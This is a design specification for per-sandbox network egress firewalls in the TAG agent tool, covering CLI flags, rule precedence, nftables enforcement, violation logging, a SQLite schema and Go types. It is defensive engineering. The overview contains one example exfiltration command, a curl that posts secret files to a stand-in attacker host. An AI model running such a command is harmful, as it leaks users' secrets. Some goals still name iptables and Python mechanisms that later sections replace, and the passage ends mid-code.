# PRD-094: Per-Sandbox Egress Firewall Rules (CIDR/Hostname Allow/Deny Lists) (`tag sandbox firewall`)

> **Stack: Go** (native single-binary; see docs/GO_MIGRATION_RESEARCH.md). This PRD was re-framed from Python to Go.

**Status:** Proposed
**Priority:** P3
**Estimated Effort:** M (1-2 weeks)
**Category:** Sandbox & Execution Environment
**Affects:** `internal/sandbox` (firewall engine + nftables enforcement), `internal/netguard` (connect-time IP-pin dialer fallback)
**Depends on:** PRD-028 (Sandbox Code Execution — provides `sandbox_runs` table, `run_in_sandbox()`, Docker backend), PRD-034 (Secret Scanning — security.py patterns reused for path validation), PRD-013 (Agent Tracing/Observability — violation events emitted as spans), PRD-005 (Execution Backend Selection — profile YAML execution config), PRD-015 (Profile Templates — `network` key in profile YAML)
**Inspired by:** E2B network isolation (`deny_out`/`allow_out` semantics), Daytona network policies, gVisor netstack, Modal `outbound_cidr_allowlist`/`outbound_domain_allowlist`

**GitHub Issue:** #348

---

## 1. Overview

TAG's sandbox subsystem (PRD-028) isolates agent-generated code from the host filesystem and applies resource caps, but it does not constrain *network egress* from the sandbox. A sandboxed process today can open arbitrary TCP connections to any internet host — even when the user runs `--network none` in intent, Docker still creates a bridge network by default unless explicitly removed. An agent executing inside a Docker or restricted-subprocess sandbox can `curl https://evil.example/ -d @/secrets` across an unrestricted loopback or bridge interface, silently exfiltrating data to any endpoint on the internet.

This PRD specifies a per-sandbox egress firewall system: configurable allow/deny rules based on CIDR ranges and hostnames, applied per sandbox invocation or inherited from a named profile's `network` policy. Rules are evaluated in a well-defined precedence order (explicit allow > explicit deny > default policy), enforced programmatically via the pure-Go netlink library `google/nftables` (host chain rules) together with the `docker/moby` client for the Docker backend, and every attempted connection that violates the active policy is recorded as a violation event in `~/.tag/runtime/tag.sqlite3` (via `internal/store`) and streamed to `~/.tag/runtime/sandbox-firewall.jsonl`.

The feature introduces two enforcement mechanisms that can operate independently or in tandem. The first is *host-level enforcement* via a per-sandbox nftables chain programmed through `google/nftables` before container start and torn down after container exit — this works without granting any capability to the container itself. The second is *container-level enforcement* via nftables inside the container network namespace, which requires `NET_ADMIN` but survives container network re-configuration and works for the restricted-subprocess (landlock+seccomp) backend via Linux network namespaces. Where nftables is unavailable (off-Linux, or unprivileged hosts), enforcement degrades to a **Go userspace connect-time IP-pin dialer** in `internal/netguard` (the same "connect-time IP-pin + redirect-revalidate dialer" the migration plan defines) — the sandboxed process is launched with its outbound connections routed through a TAG-controlled dialer that resolves, pins, and validates each destination IP against the active policy before the socket connects. The gVisor netstack (runsc) is the container-tier option for a fully userspace network stack. When neither nftables nor a controlled dialer can be applied (e.g. Docker Desktop on macOS/Windows with an arbitrary non-Go subprocess), TAG prints a documented reduced-enforcement warning. This Go reframing replaces PRD-028's Python-runtime-specific DNS-intercept hack (monkeypatching `socket.getaddrinfo`, a `PYTHONSTARTUP` shim, and a Unix-domain-socket check server), which does not port to a static Go binary.

The system ships with four named network profiles — `open` (no restrictions, current behaviour), `restricted` (deny-all egress with an empty allowlist), `pypi` (allow PyPI, GitHub, and common CDNs), and `custom` (user-defined rules stored in SQLite) — so that common use-cases require only a single flag. Per-invocation rule overrides let advanced users compose rules on the command line without touching stored configuration. Violation events carry enough context (sandbox run ID, destination IP, attempted hostname, rule that triggered, timestamp, process PID inside container) to correlate with agent traces and audit logs from PRD-013 and PRD-028.

This feature closes the network exfiltration gap that PRD-028 explicitly deferred as out-of-scope ("TAG does not implement fine-grained egress/ingress firewall rules" — PRD-028 §4 Non-Goal #2). It is directly inspired by E2B's `network={deny_out, allow_out}` parameter on `Sandbox.create()`, Modal's `outbound_cidr_allowlist` / `outbound_domain_allowlist` sandbox parameters, and Daytona's declarative network policy objects. The TAG implementation adapts these concepts to a local Docker + nftables (pure-Go netlink) reality, with a userspace IP-pin dialer fallback, while providing a CLI surface consistent with the rest of the `tag sandbox` command group.

---

## 2. Problem Statement

### 2.1 Unrestricted Network Egress Makes Sandbox Isolation Incomplete

PRD-028 was motivated by the OWASP AI Agent Security Cheat Sheet classification of unrestricted shell access as **Dangerous**. The same framework classifies unrestricted network access from a sandboxed agent as equally dangerous. An agent that cannot read `~/.ssh` but *can* reach any internet host can still:

- Send data it read *before* sandboxing began (e.g., environment variables passed as arguments) to an attacker-controlled endpoint
- Download and execute a second-stage payload that escapes the container
- Make authenticated API calls using tokens in environment variables passed into the sandbox
- Participate in a botnet or DDoS attack from the user's IP address

Today `sandbox.py:_run_docker()` passes `--network=none` as a static flag, which prevents *all* networking but also blocks legitimate use-cases like `pip install`, `curl`-ing a public dataset, or calling a public API. The result is that users disable the flag for any real workload — leaving them with zero network protection. A configurable firewall replaces the binary choice between "everything" and "nothing" with a principled allow/deny model.

### 2.2 Shared Profiles Lack Reproducible Network Security Postures

When a profile is shared between users or committed to a team repository, the `execution` block of the profile YAML specifies the sandbox backend and resource limits but says nothing about network policy. A team that wants all `coder` agent runs to be blocked from reaching any endpoint except `api.github.com` and `pypi.org` has no way to encode that constraint in the profile today. Every developer who uses that profile gets a different (often unrestricted) network posture depending on how they invoked `tag sandbox run`.

The `network` key in profile YAML, backed by stored firewall rules in SQLite, gives teams a single declarative source of truth for the network security posture of each profile — version-controlled, auditable, and consistently applied across all machines that load the profile.

### 2.3 Violation Blindness Prevents Incident Response

Even when `--network=none` is effective, there is no record of *attempted* connections. If a sandboxed agent tries to phone home and fails (due to the network restriction), no event is written anywhere. Post-incident forensic analysis of a suspicious run has no network-layer evidence — the auditor can see what commands were executed (from `sandbox_runs`) but not what connections were attempted and blocked.

The violation logging system in this PRD fills that gap: every blocked connection attempt is appended to `sandbox_firewall_violations` in SQLite and to the JSONL audit log, with enough metadata (destination, rule, run ID, PID, timestamp) to reconstruct the connection timeline for a given sandbox run.

---

## 3. Goals

| # | Goal |
|---|------|
| G1 | Allow users to specify per-invocation egress rules via `--allow-host`, `--deny-host`, `--allow-cidr`, `--deny-cidr`, and `--deny-all` / `--allow-all` flags on `tag sandbox run`. |
| G2 | Allow users to store named firewall policies attached to profiles via `tag sandbox firewall add --profile <name>` and have those policies applied automatically on every `tag sandbox run` for that profile. |
| G3 | Ship four built-in named network profiles: `open`, `restricted`, `pypi`, `custom`; selectable via `--network <name>` on `tag sandbox run`. |
| G4 | Enforce rules via host-level iptables DOCKER-USER chain for Docker backend, and via Python DNS intercept + TCP socket patching for the restricted subprocess backend. |
| G5 | Log every violation (blocked connection attempt) to `sandbox_firewall_violations` in SQLite and to `~/.tag/runtime/sandbox-firewall.jsonl`, with run_id, destination, triggered_rule, and timestamp. |
| G6 | Emit violation events as OpenTelemetry spans (PRD-013 tracing integration) so they appear in `tag trace show`. |
| G7 | Default-deny for profiles configured with `network: restricted` in profile YAML; default-allow for all other profiles (preserving current behaviour). |
| G8 | Support CIDR notation (`10.0.0.0/8`, `0.0.0.0/0`) and hostname/wildcard patterns (`api.github.com`, `*.pypi.org`, `*`) in both allow and deny lists. |
| G9 | Provide `tag sandbox firewall list`, `tag sandbox firewall show`, `tag sandbox firewall remove`, and `tag sandbox firewall test` subcommands for managing and validating stored policies. |
| G10 | All iptables rules are scoped to a per-sandbox chain named `TAG-SBX-<run_id[:8]>` and are unconditionally removed after the sandbox exits, even on SIGINT or crash. |

---

## 4. Non-Goals

| # | Non-Goal |
|---|----------|
| NG1 | Ingress firewall rules (inbound connections to the sandbox). TAG sandboxes do not serve traffic; ingress control is not needed for the threat model addressed here. |
| NG2 | Deep packet inspection or TLS SNI interception for hostname matching against encrypted traffic. Hostname matching is resolved at DNS query time (via DNS intercept) and at TCP connect time (via destination IP + reverse-DNS lookup); payload inspection is out of scope. |
| NG3 | Kubernetes NetworkPolicy or CNI plugin integration. This PRD targets local Docker and restricted subprocess backends only. |
| NG4 | Windows support for iptables-based enforcement. The DNS-intercept fallback path applies on Windows; iptables enforcement is Linux-only. |
| NG5 | Rate limiting or bandwidth throttling of allowed connections. Only allow/deny at the connection level is in scope. |
| NG6 | IPv6 firewall rules in v1. The implementation uses ip6tables stubs but does not guarantee IPv6 enforcement correctness. |
| NG7 | Automatic rule generation from agent intent (e.g., "agent says it needs PyPI, TAG should auto-allow it"). Rules are always explicitly configured by the human operator. |
| NG8 | Cross-sandbox shared-state rules or network namespaces that allow sandbox-to-sandbox communication. Each sandbox gets an independent chain. |

---

## 5. Success Metrics

| Metric | Target | Measurement Method |
|--------|--------|--------------------|
| Blocked connection latency overhead | < 2 ms added to sandbox startup per rule applied | Benchmark: time 50 sandbox starts with 10-rule policy vs. baseline |
| Violation log completeness | 100% of blocked TCP connections appear in `sandbox_firewall_violations` | Integration test: attempt 20 distinct blocked connections; assert all 20 rows written |
| Rule enforcement accuracy | Zero false negatives (allowed traffic to denied destinations) in test suite | Integration test suite with 30 deny-rule scenarios |
| Chain cleanup reliability | 0 orphaned `TAG-SBX-*` iptables chains after 100 sandbox runs including forced kills | Shell test: `iptables -L | grep TAG-SBX` after test run = empty |
| Policy apply time (Docker) | Firewall rules applied within 500 ms of container creation | Benchmark: time from `docker run` invocation to first blocked packet |
| SQLite write latency | Violation row inserted within 50 ms of blocked connection event | Benchmark: measure DB write latency for 1000 simulated violations |
| CLI surface coverage | All 7 `tag sandbox firewall` subcommands present and return exit 0 for happy path | Automated CLI test suite |
| User adoption friction | User can apply `--network restricted` in a single flag with no additional config | Manual usability test with 3 developers |

---

## 6. User Stories

| ID | As a… | I want to… | So that… |
|----|-------|-----------|----------|
| U1 | Security-conscious developer | run `tag sandbox run --code "pip install requests && python script.py" --allow-host pypi.org --deny-all` | the agent can fetch from PyPI but cannot reach any other internet host, closing the exfiltration vector |
| U2 | Team lead | set `network: restricted` in my team's `coder` profile YAML | every developer on the team gets the same restrictive network posture without needing to remember CLI flags |
| U3 | Platform engineer | run `tag sandbox firewall add --profile coder --allow "api.github.com,pypi.org,files.pythonhosted.org" --deny "*"` | I can store the team's approved egress list in the database and have it applied automatically |
| U4 | Security auditor | run `tag sandbox firewall violations --run-id abc123def456` after a suspicious run | I can see every blocked connection attempt with destination IP, triggered rule, timestamp, and PID |
| U5 | Developer | use `--network pypi` shorthand | I get a pre-configured policy that allows PyPI, GitHub, and common CDNs without listing each host manually |
| U6 | DevOps engineer | run `tag sandbox firewall test --profile coder --destination "evil.example.com"` | I can verify that the stored policy actually blocks the target before relying on it in production |
| U7 | Developer | run `tag sandbox firewall list` | I can see all stored named policies with their allow/deny rules in a single view |
| U8 | Incident responder | grep `~/.tag/runtime/sandbox-firewall.jsonl` for a run ID | I can reconstruct the full network connection timeline for a suspicious sandbox run even hours after it completed |
| U9 | Developer | use `tag sandbox run --network open` explicitly | I can opt out of any profile-level firewall for a specific invocation without modifying the profile |
| U10 | Developer | receive a clear error message when an allowed host is unreachable vs. when it is blocked by firewall | I can distinguish between network connectivity issues and firewall configuration problems during debugging |

---

## 7. Proposed CLI Surface

### 7.1 `tag sandbox run` — Egress Flag Extensions

New flags added to the existing `tag sandbox run` command:

```
tag sandbox run \
  --code "pip install httpx && python -c 'import httpx; print(httpx.get(\"https://api.github.com\").status_code)'" \
  [--allow-host api.github.com,files.pythonhosted.org,pypi.org] \
  [--allow-cidr 198.18.0.0/15] \
  [--deny-host evil.example.com,*.badactor.net] \
  [--deny-cidr 169.254.0.0/16,100.64.0.0/10] \
  [--deny-all]          # equivalent to --deny-cidr 0.0.0.0/0 plus --deny-cidr ::/0
  [--allow-all]         # explicit no-op; resets to open policy (overrides profile default)
  [--network open|restricted|pypi|custom|<policy_name>]   # named policy
  [--backend docker|restricted]
```

**Flag precedence (highest to lowest):**
1. Per-invocation `--allow-host` / `--allow-cidr` (always wins)
2. Per-invocation `--deny-host` / `--deny-cidr` / `--deny-all`
3. Named `--network <policy>` rules
4. Profile-level `network:` key from profile YAML
5. Default policy (`open` — allow all)

**Example — restricted with selective allow:**
```bash
tag sandbox run \
  --code "python fetch.py" \
  --network restricted \
  --allow-host api.github.com \
  --allow-host pypi.org \
  --allow-host files.pythonhosted.org
```

**Example — deny a specific CIDR while otherwise open:**
```bash
tag sandbox run \
  --code "python scan.py" \
  --deny-cidr 169.254.169.254/32   # block AWS IMDS
```

**Example — use built-in pypi policy:**
```bash
tag sandbox run --code "pip install pandas" --network pypi
```

**Output (when violations occur during the run):**
```
[sandbox:abc123] RUNNING python fetch.py
[firewall] BLOCKED tcp connect to 8.8.8.8:53 — matched deny rule: 0.0.0.0/0 (run: abc123def4)
[sandbox:abc123] EXIT 1 (1.23s)

Firewall violations: 1
  1. 2026-06-17T10:22:31Z  tcp  8.8.8.8:53  rule=deny:0.0.0.0/0  pid=42
```

---

### 7.2 `tag sandbox firewall add`

Store a named firewall policy associated with a profile:

```
tag sandbox firewall add \
  --profile <profile_name> \
  [--policy-name <name>]              # default: profile_name
  --allow "<host1>,<host2>,..."       # comma-separated hosts or CIDRs
  --deny "<host1>,*,..."              # comma-separated hosts, CIDRs, or * for deny-all
  [--description "Policy description"]
  [--replace]                         # overwrite existing policy with same name
```

**Example:**
```bash
tag sandbox firewall add \
  --profile coder \
  --allow "api.github.com,pypi.org,files.pythonhosted.org,*.githubusercontent.com" \
  --deny "*" \
  --description "Coder profile: PyPI + GitHub only"
```

**Output:**
```
Firewall policy saved.
  Profile:     coder
  Policy name: coder
  Allow:       api.github.com, pypi.org, files.pythonhosted.org, *.githubusercontent.com
  Deny:        * (deny-all default)
  Default:     deny
  Created:     2026-06-17T10:25:00Z
  ID:          fw_7f3a9b2c
```

---

### 7.3 `tag sandbox firewall list`

List all stored firewall policies:

```
tag sandbox firewall list [--profile <name>] [--json]
```

**Output (table):**
```
ID           Profile    Policy Name  Default  Allow Rules  Deny Rules  Created
fw_7f3a9b2c  coder      coder        deny     4            1           2026-06-17
fw_1a2b3c4d  researcher researcher   allow    0            2           2026-06-15
(built-in)   —          open         allow    *            —           —
(built-in)   —          restricted   deny     —            *           —
(built-in)   —          pypi         deny     13           1           —
```

---

### 7.4 `tag sandbox firewall show`

Show full details of a stored policy:

```
tag sandbox firewall show <policy_name_or_id> [--json]
```

**Output:**
```
Policy: coder (fw_7f3a9b2c)
Profile: coder
Default policy: deny
Description: Coder profile: PyPI + GitHub only
Created: 2026-06-17T10:25:00Z

Allow rules (4):
  host  api.github.com
  host  pypi.org
  host  files.pythonhosted.org
  host  *.githubusercontent.com  [wildcard]

Deny rules (1):
  cidr  0.0.0.0/0  [deny-all]
```

---

### 7.5 `tag sandbox firewall remove`

Remove a stored policy:

```
tag sandbox firewall remove <policy_name_or_id> [--profile <name>] [--yes]
```

**Output:**
```
Removed firewall policy 'coder' (fw_7f3a9b2c).
Warning: profile 'coder' referenced this policy via network: coder.
  The profile will fall back to the 'open' (default-allow) policy.
  Update the profile YAML network key to suppress this warning.
```

---

### 7.6 `tag sandbox firewall test`

Dry-run test whether a destination would be allowed or denied by a policy:

```
tag sandbox firewall test \
  --profile <name>|--policy <name_or_id> \
  --destination <hostname_or_ip>[:<port>] \
  [--proto tcp|udp]
```

**Output (blocked):**
```
Result: BLOCKED
  Destination:    evil.example.com (resolved: 203.0.113.42)
  Matched rule:   deny host * (deny-all)
  Policy:         coder (default: deny)
  Evaluation:
    1. Check allow rules for 203.0.113.42... no match
    2. Check deny rules for evil.example.com... matched: deny:*
    → DENY
```

**Output (allowed):**
```
Result: ALLOWED
  Destination:    api.github.com (resolved: 140.82.121.5)
  Matched rule:   allow host api.github.com
  Policy:         coder (default: deny)
  Evaluation:
    1. Check allow rules for api.github.com... matched: allow:api.github.com
    → ALLOW
```

---

### 7.7 `tag sandbox firewall violations`

Query the violations log:

```
tag sandbox firewall violations \
  [--run-id <run_id>] \
  [--since <ISO8601_or_relative>]   # e.g. "1h", "2026-06-17"
  [--limit 50]
  [--json]
```

**Output:**
```
Firewall violations (run: abc123def456, 3 events)

Time                      Proto  Destination          Port  Rule              PID
2026-06-17T10:22:31Z      tcp    8.8.8.8              53    deny:0.0.0.0/0    42
2026-06-17T10:22:31Z      tcp    169.254.169.254      80    deny:0.0.0.0/0    42
2026-06-17T10:22:45Z      tcp    evil.example.com     443   deny:*            43
```

---

## 8. Functional Requirements

| ID | Requirement | Priority |
|----|-------------|----------|
| FR-01 | `tag sandbox run` MUST accept `--allow-host`, `--deny-host`, `--allow-cidr`, `--deny-cidr`, `--deny-all`, `--allow-all`, and `--network` flags. Unrecognised values MUST produce a clear error. | P0 |
| FR-02 | The firewall engine MUST evaluate rules in order: explicit per-invocation allow > explicit per-invocation deny > named policy allow > named policy deny > profile-level default > global default (`open`). | P0 |
| FR-03 | For the Docker backend, egress rules MUST be enforced via a per-sandbox nftables chain `TAG-SBX-<run_id[:8]>` programmed through `google/nftables` (pure-Go netlink) on the host, hooked ahead of Docker's own chains, before container start. | P0 |
| FR-04 | For the restricted-subprocess backend, egress rules MUST be enforced via the `internal/netguard` connect-time IP-pin dialer: the sandboxed process's outbound connections are routed through a TAG-controlled `net.Dialer`/`DialContext` that resolves, pins, and validates each destination IP against the active policy before the socket connects (replacing Python `socket.getaddrinfo` monkeypatching). | P0 |
| FR-05 | All nftables chains created for a sandbox run MUST be unconditionally removed after the run exits, including on SIGINT, SIGTERM, and panic. Use `defer` plus `signal.NotifyContext`/`os/signal` handlers so cleanup runs on every exit path. | P0 |
| FR-06 | Hostname rules MUST support exact match (`api.github.com`) and single-level wildcard (`*.github.com`). Multi-level wildcards (`**.github.com`) are NOT required in v1. | P1 |
| FR-07 | CIDR rules MUST use Go `net/netip` — `netip.ParsePrefix` for parsing and `Prefix.Contains(netip.Addr)` for matching. Invalid CIDR notation MUST return a validation error before sandbox start. | P0 |
| FR-08 | Every blocked connection attempt MUST produce a `sandbox_firewall_violations` row within 50 ms of the block event, containing: `run_id`, `proto`, `destination_host`, `destination_ip`, `destination_port`, `triggered_rule`, `pid`, `violated_at`. | P0 |
| FR-09 | Every blocked connection attempt MUST be appended to `~/.tag/runtime/sandbox-firewall.jsonl` as a newline-delimited JSON object with the same fields as FR-08. | P1 |
| FR-10 | `tag sandbox firewall add` MUST validate all hostnames and CIDRs at save time. It MUST reject rules that would permanently block localhost (127.0.0.0/8) to prevent misconfiguration that breaks the sandbox itself. | P1 |
| FR-11 | The four built-in named policies (`open`, `restricted`, `pypi`, `custom`) MUST be immutable. Attempts to overwrite them MUST produce an error; users must use `--policy-name` to create a custom policy. | P1 |
| FR-12 | The `pypi` built-in policy MUST allow: `pypi.org`, `files.pythonhosted.org`, `api.github.com`, `github.com`, `objects.githubusercontent.com`, `*.github.com`, `cdn.jsdelivr.net`, `registry.npmjs.org`, `registry.yarnpkg.com`, `dl-cdn.alpinelinux.org`, `deb.debian.org`, `security.debian.org`, `archive.ubuntu.com`, `security.ubuntu.com`, and `*.cloudfront.net`. | P2 |
| FR-13 | `tag sandbox firewall test` MUST perform real DNS resolution of the destination hostname and evaluate the result against both the resolved IP and the hostname. It MUST NOT make any actual TCP connection. | P1 |
| FR-14 | When a profile YAML contains `network: restricted` (or any named policy), `run_in_sandbox()` MUST load the corresponding policy from SQLite before applying per-invocation rule overrides. | P0 |
| FR-15 | Violation events MUST be emitted as OpenTelemetry spans (via `internal/obs` / `go.opentelemetry.io/otel`) with `sandbox.firewall.violation` event name and attributes: `sandbox.run_id`, `network.peer.address`, `network.peer.port`, `firewall.rule`, `process.pid`. | P2 |
| FR-16 | `tag sandbox firewall violations` MUST support filtering by `--run-id`, `--since`, and `--limit`. When `--json` is given, output MUST be a JSON array of violation objects. | P1 |
| FR-17 | On hosts where nftables is unavailable (macOS/Windows, or unprivileged Linux), enforcement MUST fall back to the `internal/netguard` connect-time IP-pin dialer; where the dialer cannot be applied (arbitrary non-Go subprocess), TAG MUST degrade to Docker Desktop / plain subprocess and print a documented reduced-enforcement warning. gVisor netstack (runsc) is the container-tier option. | P2 |
| FR-18 | Profile YAML `network` key MUST accept both built-in policy names and custom policy names stored in SQLite. Loading a profile with an unknown `network` value MUST warn but MUST NOT fail the sandbox run (falls back to `open`). | P1 |

---

## 9. Non-Functional Requirements

| ID | Requirement | Target |
|----|-------------|--------|
| NFR-01 | Sandbox startup overhead from firewall rule application MUST be < 200 ms for the Docker backend (nftables chain creation via netlink) and < 10 ms for the restricted-subprocess backend (netguard dialer setup). | Benchmark |
| NFR-02 | Violation log writes MUST be non-blocking from the sandbox's perspective. Use a dedicated goroutine draining a buffered channel for SQLite writes; blocking the enforcement path on DB I/O is not acceptable. | Architecture |
| NFR-03 | The firewall package MUST depend only on the Go standard library plus the sanctioned migration modules (`google/nftables`, `modernc.org/sqlite`). `net/netip`, `context`, `os/signal`, and `encoding/json` cover the core logic; no CGO. | Code review |
| NFR-04 | All nftables/netlink operations MUST be bounded by a `context` deadline (5s) and MUST NOT block sandbox startup if nftables is unavailable or errors. Failures fall back to the netguard dialer, or to `open` policy with a logged warning. | Code review |
| NFR-05 | The `sandbox_firewall_violations` table MUST be indexed on `(run_id, violated_at)` and `violated_at` to support efficient time-range queries without full table scans. | Schema |
| NFR-06 | The JSONL audit log MUST be append-only and MUST NOT be truncated by TAG operations. Rotation is the user's responsibility. | Architecture |
| NFR-07 | Firewall rule removal (nftables chain flush + delete) MUST complete within 1 second of sandbox exit for chains with up to 1000 rules. | Benchmark |
| NFR-08 | The feature MUST be fully functional on Go 1.24+ and MUST NOT require CGO or any new mandatory host dependency. `google/nftables` is a pure-Go module; the nftables kernel subsystem is an optional Linux runtime dependency (documented, with graceful fallback). | Compatibility |
| NFR-09 | All user-facing error messages related to firewall misconfiguration MUST suggest the corrective action (e.g., "Invalid CIDR '10.0.x.y/24': use dotted-decimal notation like '10.0.0.0/24'"). | UX |
| NFR-10 | The SQLite (`modernc.org/sqlite`) WAL-mode store used by all sandbox tables MUST handle concurrent writes from the violation-logger goroutine and the main goroutine without `SQLITE_BUSY`. Use a 5s busy timeout (`_busy_timeout`/`PRAGMA busy_timeout`) and WAL mode, under the single-writer contract. | Architecture |

---

## 10. Technical Design

### 10.1 New Packages and Modifications

| Package / file | Change |
|------|--------|
| `internal/sandbox/firewall.go` | Firewall engine: `FirewallRule`/`FirewallPolicy`/`FirewallEngine`, rule matching, precedence evaluation |
| `internal/sandbox/nftables.go` | Host-level nftables manager over `google/nftables` (chain create/teardown); Linux-only build target |
| `internal/sandbox/violation.go` | `ViolationLogger` goroutine draining a buffered channel to SQLite + JSONL |
| `internal/netguard/` | Connect-time IP-pin `DialContext` used as the enforcement fallback for the restricted-subprocess backend and off-Linux hosts |
| `internal/cli/sandbox_firewall.go` | `firewall add/list/show/remove/test/violations` cobra subcommands; egress flags on `sandbox run` |
| `internal/store/migrate/` | New tables `sandbox_firewall_policies`, `sandbox_firewall_rules`, `sandbox_firewall_violations`; built-in policy seeding (`database/sql` + modernc driver) |
| `~/.tag/runtime/tag.sqlite3` | The above tables, owned by `internal/store` under the single-writer + WAL contract |
| `~/.tag/runtime/sandbox-firewall.jsonl` | Append-only JSONL violation audit log (new file, created on first violation) |

### 10.2 SQLite DDL

The DDL stays SQL. It is applied by the `internal/store` migration runner over the `database/sql` API with the pure-Go `modernc.org/sqlite` driver (`CGO_ENABLED=0`), and built-in policies are seeded with `INSERT OR IGNORE` on first migration (see §10.8). `CREATE TABLE IF NOT EXISTS` and `CREATE INDEX IF NOT EXISTS` need no error-guarding; any future `ALTER TABLE` would be guarded by an error-check on the `duplicate column name` substring.

```sql
-- Stored named firewall policies
CREATE TABLE IF NOT EXISTS sandbox_firewall_policies (
    id           TEXT PRIMARY KEY,          -- 'fw_' + hex(8)
    name         TEXT NOT NULL UNIQUE,      -- user-visible name ('coder', 'pypi', etc.)
    profile_name TEXT,                      -- NULL for global/standalone policies
    default_action TEXT NOT NULL            -- 'allow' | 'deny'
        CHECK(default_action IN ('allow', 'deny')),
    description  TEXT NOT NULL DEFAULT '',
    is_builtin   INTEGER NOT NULL DEFAULT 0, -- 1 for built-in policies (immutable)
    created_at   TEXT NOT NULL,
    updated_at   TEXT NOT NULL
);

CREATE INDEX IF NOT EXISTS idx_sfp_profile
    ON sandbox_firewall_policies(profile_name);

-- Individual rules belonging to a policy (ordered by priority)
CREATE TABLE IF NOT EXISTS sandbox_firewall_rules (
    id           TEXT PRIMARY KEY,          -- 'fwr_' + hex(8)
    policy_id    TEXT NOT NULL
        REFERENCES sandbox_firewall_policies(id) ON DELETE CASCADE,
    action       TEXT NOT NULL             -- 'allow' | 'deny'
        CHECK(action IN ('allow', 'deny')),
    rule_type    TEXT NOT NULL             -- 'host' | 'cidr' | 'wildcard'
        CHECK(rule_type IN ('host', 'cidr', 'wildcard')),
    value        TEXT NOT NULL,            -- 'api.github.com' | '10.0.0.0/8' | '*.github.com'
    priority     INTEGER NOT NULL DEFAULT 100, -- lower = evaluated first
    created_at   TEXT NOT NULL
);

CREATE INDEX IF NOT EXISTS idx_sfr_policy_priority
    ON sandbox_firewall_rules(policy_id, priority, action);

-- Violation events (blocked connection attempts)
CREATE TABLE IF NOT EXISTS sandbox_firewall_violations (
    id               TEXT PRIMARY KEY,      -- 'sfv_' + hex(8)
    run_id           TEXT NOT NULL,         -- FK to sandbox_runs.id
    proto            TEXT NOT NULL DEFAULT 'tcp'
        CHECK(proto IN ('tcp', 'udp', 'icmp', 'unknown')),
    destination_host TEXT,                  -- original hostname (may be NULL if direct IP)
    destination_ip   TEXT NOT NULL,
    destination_port INTEGER,
    triggered_rule   TEXT NOT NULL,         -- human-readable: 'deny:0.0.0.0/0', 'deny:host:*'
    pid              INTEGER,               -- PID inside container/subprocess
    violated_at      TEXT NOT NULL          -- ISO8601 UTC
);

CREATE INDEX IF NOT EXISTS idx_sfv_run_time
    ON sandbox_firewall_violations(run_id, violated_at);
CREATE INDEX IF NOT EXISTS idx_sfv_time
    ON sandbox_firewall_violations(violated_at);
```

### 10.3 Core Types

Python enums become typed string constants; dataclasses become structs; `ipaddress` becomes `net/netip` (`netip.Addr`/`netip.Prefix`); the lazily-parsed `_cidr_network` becomes a parsed `netip.Prefix` field populated by `Validate()`; `ValueError` becomes a returned `error`.

```go
package sandbox

import (
    "fmt"
    "net/netip"
    "sort"
    "strings"
)

type FirewallAction string

const (
    ActionAllow FirewallAction = "allow"
    ActionDeny  FirewallAction = "deny"
)

type RuleType string

const (
    RuleHost     RuleType = "host"     // exact hostname: api.github.com
    RuleCIDR     RuleType = "cidr"     // IP range: 10.0.0.0/8
    RuleWildcard RuleType = "wildcard" // single-level wildcard: *.github.com
)

type FirewallRule struct {
    Action    FirewallAction
    Type      RuleType
    Value     string // raw value as entered
    Priority  int    // default 100; lower = evaluated first
    ID        string
    PolicyID  string
    CreatedAt string

    prefix netip.Prefix // parsed form, populated by Validate (CIDR rules only)
}

// Validate parses and validates the rule value; netip.ParsePrefix replaces
// ipaddress.ip_network. Returns an error instead of raising ValueError.
func (r *FirewallRule) Validate() error {
    switch r.Type {
    case RuleCIDR:
        p, err := netip.ParsePrefix(r.Value)
        if err != nil {
            return fmt.Errorf("invalid CIDR %q: use notation like 10.0.0.0/24", r.Value)
        }
        r.prefix = p.Masked()
    case RuleWildcard:
        if !strings.HasPrefix(r.Value, "*.") {
            return fmt.Errorf("wildcard rules must start with '*.' — got %q", r.Value)
        }
    case RuleHost:
        if strings.Contains(r.Value, "*") {
            return fmt.Errorf("use rule_type=wildcard for patterns containing '*' — got %q", r.Value)
        }
    }
    return nil
}

func (r *FirewallRule) MatchesHost(hostname string) bool {
    switch r.Type {
    case RuleHost:
        return strings.EqualFold(hostname, r.Value)
    case RuleWildcard:
        suffix := r.Value[1:] // strip leading '*'
        return strings.HasSuffix(strings.ToLower(hostname), strings.ToLower(suffix))
    }
    return false // CIDR rules matched separately via MatchesIP
}

func (r *FirewallRule) MatchesIP(addr string) bool {
    if r.Type != RuleCIDR {
        return false
    }
    a, err := netip.ParseAddr(addr)
    if err != nil {
        return false
    }
    return r.prefix.Contains(a) // Prefix.Contains replaces `ip in network`
}

type FirewallPolicy struct {
    Name          string
    DefaultAction FirewallAction // default ActionAllow
    AllowRules    []FirewallRule
    DenyRules     []FirewallRule
    ID            string
    ProfileName   string
    Description   string
    IsBuiltin     bool
}

// Evaluate resolves a connection to (hostname, ip).
// Precedence: explicit allow > explicit deny > DefaultAction.
func (p *FirewallPolicy) Evaluate(hostname, ip string) FirewallAction {
    match := func(rules []FirewallRule) bool {
        sorted := append([]FirewallRule(nil), rules...)
        sort.SliceStable(sorted, func(i, j int) bool { return sorted[i].Priority < sorted[j].Priority })
        for i := range sorted {
            if (hostname != "" && sorted[i].MatchesHost(hostname)) || sorted[i].MatchesIP(ip) {
                return true
            }
        }
        return false
    }
    if match(p.AllowRules) {
        return ActionAllow
    }
    if match(p.DenyRules) {
        return ActionDeny
    }
    return p.DefaultAction
}

type FirewallViolation struct {
    RunID           string
    DestinationIP   string
    TriggeredRule   string
    ViolatedAt      string // ISO8601 UTC
    Proto           string // default "tcp"
    DestinationHost string
    DestinationPort int
    PID             int
    ID              string
}

// SandboxFirewallConfig is the resolved config for one invocation: a stored
// policy plus per-invocation overrides applied before evaluation.
type SandboxFirewallConfig struct {
    Policy          FirewallPolicy
    ExtraAllowHosts []string
    ExtraDenyHosts  []string
    ExtraAllowCIDRs []string
    ExtraDenyCIDRs  []string
    DenyAll         bool // shorthand for ExtraDenyCIDRs = ["0.0.0.0/0","::/0"]
    AllowAll        bool // override to open policy for this invocation
}
```

### 10.4 Firewall Engine

The engine resolves and evaluates the active policy. The Python `queue.Queue.put_nowait` becomes a non-blocking send on a buffered Go channel; `datetime.now(timezone.utc).isoformat()` becomes `time.Now().UTC().Format(time.RFC3339)`.

```go
package sandbox

import (
    "fmt"
    "net/netip"
    "sort"
    "strings"
    "time"
)

type FirewallEngine struct {
    cfg   SandboxFirewallConfig
